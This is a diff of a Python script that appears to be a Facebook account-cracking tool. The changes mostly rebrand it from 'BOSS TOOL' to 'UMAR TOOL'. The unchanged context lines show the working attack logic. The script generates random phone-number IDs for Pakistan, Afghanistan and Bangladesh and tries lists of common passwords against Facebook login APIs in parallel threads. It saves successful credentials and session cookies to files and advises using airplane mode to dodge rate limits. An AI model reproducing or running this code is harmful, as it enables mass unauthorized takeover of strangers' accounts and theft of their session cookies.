@@ -2,7 +2,7 @@
 
 #!/usr/bin/python3
 #coding/utf/
-#created/by/mr.boss
+#created/by/Umar Nazeer 
 def clear():
         os.system('clear')
 #_________[ IMPORTING MODULES ]______>>
@@ -44,13 +44,13 @@ try:
 except:pass
 #_________[ TRACKING USERS IP ]______>>
 ip = requests.get("https://api.ipify.org").text
-print('\033[0;97m[•] \033[0;92mBOSS TOOL IS TRACKING YOUR IP ADDRESS')
+print('\033[0;97m[•] \033[0;92mCyber TOOL IS TRACKING YOUR IP ADDRESS')
 time.sleep(2)
 print("\033[0;97m[•] \x1b[1;92mTHIS IS YOUR IP ADDRESS \x1b[1;91m:\033[1;36m "+ip)
 #_________[ UA ]______>>
 usr=[]
 try:
-    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
+    xd=requests.get('https://github.com/CyberAttack85/Cyber-Attack/blob/main/ua.txt').text.splitlines()
     for us in xd:
         usr.append(us)
 except: pass
@@ -320,12 +320,12 @@ def menu():
         try:
                 x = ("sex")
                 if x == ("sex"):
-                        print('\t\x1b[1;92m        BOSS TOOL MAIN MENU\n\033[1;97m====================================================\n\033[0;97m[1] \033[0;92mFILE CLONING\n\033[0;97m[2] \033[0;92mRANDOM PAK CLONING\n\033[0;97m[3] \033[0;92mCONTACT WITH OWNER\n\033[0;97m[0] \033[0;91mEXIT')
+                        print('\t\x1b[1;92m        UMAR TOOL MAIN MENU\n\033[1;97m====================================================\n\033[0;97m[1] \033[0;92mFILE CLONING\n\033[0;97m[2] \033[0;92mRANDOM PAK CLONING\n\033[0;97m[3] \033[0;92mCONTACT WITH OWNER\n\033[0;97m[0] \033[0;91mEXIT')
                         linex()
                         xd=input('\033[0;97m[•] \033[0;92mCHOOSE \x1b[1;91m: \x1b[1;96m')
                         if xd in ['1','01']:
                                 clear()
-                                print('\t\x1b[1;92m        BOSS TOOL FILE CLONER')
+                                print('\t\x1b[1;92m        UMAR TOOL FILE CLONER')
                                 linex()
                                 print('\033[0;97m[+] \33[1;92mPUT FILE EXAMPLE \x1b[1;91m:  \x1b[1;96m/sdcard/File.txt  etc..')
                                 linex()
@@ -338,7 +338,7 @@ def menu():
                                         clear()
                                         menu()
                                 clear()
-                                print('\t\x1b[1;92m        BOSS TOOL METHODS MENU')
+                                print('\t\x1b[1;92m        UMAR TOOL METHODS MENU')
                                 linex()
                                 print('\033[0;97m[1] \033[0;92mMETHOD \033[0;97m(\033[0;96mNEW IDS\033[0;97m)')
                                 print('\033[0;97m[2] \033[0;92mMETHOD \033[0;97m(\033[0;96mMIX IDS\033[0;97m)')
@@ -352,14 +352,14 @@ def menu():
                                 except:
                                         ps_limit =1
                                 clear()
-                                print('\t\x1b[1;92m     BOSS TOOL PASSWORD MENU')
+                                print('\t\x1b[1;92m     UMAR TOOL PASSWORD MENU')
                                 linex()
                                 print('\033[0;97m[+]\033[1;32m EXAMPLE \033[0;91m: \033[0;96mfirst last,firtslast,first123')
                                 linex()
                                 for i in range(ps_limit):
                                         plist.append(input(f'\033[0;97m[•] \x1b[1;92mPUT PASSWORD {i+1} \033[1;31m: \033[1;36m'))
                                 clear()
-                                print('\t\x1b[1;92m  BOSS TOOL ACCOUNTS DISPLAY MENU')
+                                print('\t\x1b[1;92m  UMAR TOOL ACCOUNTS DISPLAY MENU')
                                 linex()
                                 print('\033[0;97m[•]\x1b[1;92m DO YOU WANT SHOW CP ACCOUNTS? \033[1;37m(\033[1;36my\033[1;37m/\x1b[1;96mn\033[1;37m) \033[1;31m: \x1b[1;93m')
                                 linex()
@@ -371,11 +371,11 @@ def menu():
                                 with tred(max_workers=30) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
-                                        print('\t\x1b[1;92m   BOSS TOOL FILE CRACKING MENU')
+                                        print('\t\x1b[1;92m   UMAR TOOL FILE CRACKING MENU')
                                         linex()
                                         print('\033[0;97m[•] \033[0;92mTOTAL ACCOUNTS  \033[0;91m:  \033[0;96m'+total_ids+'')
                                         print("\033[0;97m[•] \x1b[1;92mCLONING STARTED \033[1;91m:  \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
-                                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
+                                        print('\033[0;97m[•]\x1b[1;92m UMAR TOOL CRACKING HAS BEEN STARTED')
                                         linex()
                                         print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                                         linex()
@@ -392,13 +392,13 @@ def menu():
                                 linex()
                                 print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED')
                                 print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
-                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-COOKIE.txt') 
-                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-OK.txt')
+                                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/UMAR-COOKIE.txt') 
+                                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/UMAR-OK.txt')
                                 linex()
                                 input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear();menu()
                         elif xd in ['2','02']:
                                 clear()
-                                print('\t\x1b[1;92m   BOSS TOOL RANDOM CLONING MENU')
+                                print('\t\x1b[1;92m   UMAR TOOL RANDOM CLONING MENU')
                                 linex()
                                 print('\033[1;37m[1] \x1b[1;92mPAKISTAN RANDOM CLONING\n\033[1;37m[2] \x1b[1;92mBANGLADESH RANDOM CLONING\n\033[1;37m[3] \x1b[1;92mAFGHANISTAN RANDOM CLONING\n\033[1;37m[0] \033[1;32mBACK IN MAIN MENU ')
                                 linex()
@@ -415,10 +415,10 @@ def menu():
                                 os.system('xdg-open https://www.facebook.com/mradi5000');menu() 
                         elif xd in ['0','00']:
                                 clear()
-                                print('\t\x1b[1;92m   EXIT FROM BOSS TOOL')
+                                print('\t\x1b[1;92m   EXIT FROM UMAR TOOL')
                                 linex()
                                 input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO CONTACT OWNER ');clear() 
-                                os.system('xdg-open https://www.facebook.com/mradi5000');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE BOSS TOOL');time.sleep(2);linex();exit() 
+                                os.system('xdg-open https://www.facebook.com/mradi5000');print('\x1b[1;97m[•] \x1b[1;92mPROGRAM CLOSED THANKS FOR USE UMAR TOOL');time.sleep(2);linex();exit() 
                         else:
                                 print('\033[0;97m[•] \033[0;91mCHOOSE CORRECT OPTION');menu()
         except ValueError:
@@ -430,7 +430,7 @@ def menu():
 def pak():
                 user=[]
                 clear()
-                print('\t\x1b[1;92m  BOSS TOOL PAK RANDOM CLONER MENU')
+                print('\t\x1b[1;92m  UMAR TOOL PAK RANDOM CLONER MENU')
                 linex()
                 print('\t\x1b[1;92m       PAKISTAN SIM CODE MENU')
                 linex()
@@ -445,10 +445,10 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as BOSS:     
+                with tred(max_workers=30) as UMAR:     
                         clear()
                         tl = str(len(user))
-                        print('\t\x1b[1;92m   BOSS TOOL RANDOM PAK CRACKING MENU')
+                        print('\t\x1b[1;92m   UMAR TOOL RANDOM PAK CRACKING MENU')
                         linex()
                         print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                         print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
@@ -460,13 +460,13 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan123','khan123','khan12345','baloch123','baloch786','khan123456','i love you','khanbaba','khankhan','baloch','freefire','malik786','malik1122','malik123','malik12345','malik123456']
-                                BOSS.submit(rndm,ids,passlist)
+                                UMAR.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print('\033[0;97m[•]\x1b[1;92m THE PROCESS HAS COMPLETED ')
                 print('\033[0;97m[•]\x1b[1;92m TOTAL OK/CP ACCOUNTS \x1b[1;91m:\x1b[1;92m '+str(len(oks))+'\033[1;37m/\033[1;31m'+str(len(cps)))
-                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-rndm-COOKIE.txt') 
-                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/BOSS-rndm-OK.txt')
+                print('\033[0;97m[•]\033[1;32m COOKIES SAVED IN \033[1;31m: \033[1;32m/sdcard/UMAR-rndm-COOKIE.txt') 
+                print('\033[0;97m[•]\033[1;32m OK ACCOUNTS SAVED IN \033[1;31m: \033[1;32m/sdcard/UMAR-rndm-OK.txt')
                 linex()
                 input('\033[0;97m[•]\x1b[1;92m PRESS ENTER TO BACK');clear()
                 menu()
@@ -474,7 +474,7 @@ def pak():
 def afg():
                 user=[]
                 clear()
-                print('\t\x1b[1;92m  BOSS TOOL AFG RANDOM CLONER MENU')
+                print('\t\x1b[1;92m  UMAR TOOL AFG RANDOM CLONER MENU')
                 linex()
                 print('\t\x1b[1;92m       AFG SIM CODE MENU')
                 linex()
@@ -489,15 +489,15 @@ def afg():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as BOSS:     
+                with tred(max_workers=30) as UMAR:     
                         clear()
                         tl = str(len(user))
-                        print('\t\x1b[1;92m   BOSS TOOL RANDOM AFG CRACKING MENU')
+                        print('\t\x1b[1;92m   UMAR TOOL RANDOM AFG CRACKING MENU')
                         linex()
                         print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                         print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                         print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
-                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
+                        print('\033[0;97m[•]\x1b[1;92m UMAR TOOL CRACKING HAS BEEN STARTED')
                         linex() 
                         print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                         linex()
@@ -516,7 +516,7 @@ def afg():
 def bd():
                 user=[]
                 clear()
-                print('    \x1b[1;92mBOSS TOOL BANGLADESH RANDOM  CLONER MENU')
+                print('    \x1b[1;92mUMAR TOOL BANGLADESH RANDOM  CLONER MENU')
                 linex()
                 print('\t\x1b[1;92m      BANGLADESH  SIM CODE MENU')
                 linex()
@@ -534,12 +534,12 @@ def bd():
                 with tred(max_workers=30) as BOSS:     
                         clear()
                         tl = str(len(user))
-                        print('      \x1b[1;92mBOSS TOOL RANDOM BANGLADESH CRACKING MENU')
+                        print('      \x1b[1;92mUMAR TOOL RANDOM BANGLADESH CRACKING MENU')
                         linex()
                         print('\033[0;97m[•] \x1b[1;92mTOTAL ACCOUNTS \x1b[1;91m: \033[1;36m'+tl)
                         print(f'\033[0;97m[•]\033[1;32m CHOICE CODE    \x1b[1;91m:\033[1;36m '+code)
                         print("\033[0;97m[•] \x1b[1;92mCLONING STARTED\033[1;91m: \033[1;96mTIME \033[1;97m[\033[1;96m"+str(a)+"\033[1;91m:\033[1;96m"+str(lt()[4])+" "+ tag+"\x1b[1;97m]")
-                        print('\033[0;97m[•]\x1b[1;92m BOSS TOOL CRACKING HAS BEEN STARTED')
+                        print('\033[0;97m[•]\x1b[1;92m UMAR TOOL CRACKING HAS BEEN STARTED')
                         linex() 
                         print('\x1b[1;97m[•] \x1b[1;96mUSE FLIGHT [\x1b[38;5;205mAIRPLANE\033[1;37m] \x1b[1;96mMODE IN EVERY 5 MINUTES')
                         linex()
@@ -606,8 +606,8 @@ def ffb(ids,names,passlist):
                                 break
                         elif 'checkpoint' in BOSS:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
-                                        open('/sdcard/BOSS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;92m[\033[0;91mUMAR-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
+                                        open('/sdcard/UMAR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -684,7 +684,7 @@ def api(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                                        print('\r\33[1;92m[\033[0;97mBOSS-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
+                                        print('\r\33[1;92m[\033[0;97mUMAR-OK\033[1;92m]\033[1;92m '+ids+'\033[1;37m | \033[1;32m'+pas+ ' '+joined(ids)+' ')
                                         open('/sdcard/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
                                         open('/sdcard/BOSS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                         oks.append(ids)
@@ -695,7 +695,7 @@ def api(ids,names,passlist):
                                                 break                   
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;92m[\033[0;91mUMAR-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
                                                 open('/sdcard/BOSS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
@@ -770,19 +770,19 @@ def api1(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
-                                        print('\r\r\x1b[1;92m[\033[0;97mBOSS-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
-                                        open('/sdcard/BOSS-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        open('/sdcard/BOSS-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
+                                        print('\r\r\x1b[1;92m[\033[0;97mUMAR-OK\033[0;92m]\033[1;92m '+ids+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(ids)+' ')
+                                        open('/sdcard/UMAR-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/UMAR-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+'\n')
                                         oks.append(ids)
                                 elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;92m[\033[0;96mBOSS-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
+                                                print('\r\r\x1b[1;92m[\033[0;96mUMAR-OK\033[0;92m]\033[1;91m '+ids+' \033[1;37m|\033[1;31m '+pas+ ' '+joined(ids)+' ')
                                                 twf.append(ids)
                                                 break           
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
                                                 print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+ids+' \033[0;97m| \033[0;90m'+pas+'\033[1;97m')
-                                                open('/sdcard/BOSS-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/UMAR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
@@ -796,7 +796,7 @@ def api1(ids,names,passlist):
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mBOSS-CRACKING\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m[\x1b[38;5;208mUMAR-CRACKING\x1b[1;97m] \x1b[1;97m[\x1b[1;93m%s\x1b[1;97m] \033[1;37m[\x1b[1;92mOK ACCOUNTS\x1b[1;91m:\x1b[1;92m %s\x1b[1;97m] \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -850,19 +850,19 @@ def rndm(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/BOSS-OK.txt','r').read()
+                                                okk=open('/sdcard/UMAR-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
                                                         coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                                                         print('\r\r\x1b[1;92m[\033[0;97mBOSS-OK\033[0;92m]\033[1;92m '+uid+' \033[1;37m|\033[1;32m '+pas+ ' '+joined(uid)+' ')      
                                                         #print("Cookie: "+coki)
-                                                        open('/sdcard/BOSS-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
-                                                        open('/sdcard/BOSS-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
+                                                        open('/sdcard/UMAR-rndm-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        open('/sdcard/UMAR-rndm-COOKIE.txt', 'a').write(uid+'|'+pas+'|'+coki+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
                                                 print('\r\r\x1b[1;92m[\033[0;91mBOSS-CP\033[0;92m] \033[0;90m'+uid+' \033[0;97m|\033[0;90m '+pas+'\033[1;97m')
-                                                open('/sdcard/BOSS-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                open('/sdcard/ZUMAR-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                 else:
